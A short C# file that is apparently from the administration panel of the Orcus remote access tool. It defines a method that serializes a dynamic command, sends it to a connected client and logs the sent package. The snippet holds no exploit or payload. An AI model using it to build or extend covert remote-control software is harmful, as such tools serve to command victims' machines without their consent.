using System;
using Orcus.Administration.Core.CommandManagement;
using Orcus.Administration.Plugins.Administration;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Core
{
    public partial class ConnectionManager : IServerConnection
    {
        public StaticCommander StaticCommander { get; }

        public void SendCommand(DynamicCommand dynamicCommand)
        {
            var serializer = new Serializer(DynamicCommandInfo.RequiredTypes);
            var data = serializer.Serialize(dynamicCommand);
            Sender.SendDynamicCommand(data);
            _packageSentEventHandler?.Invoke(this, new PackageInformation
            {
                IsReceived = false,
                Timestamp = DateTime.Now,
                Description = $"SendDynamicCommand (ID: {dynamicCommand.CommandId})",
                Size = data.Length + 5
            });
        }
    }
}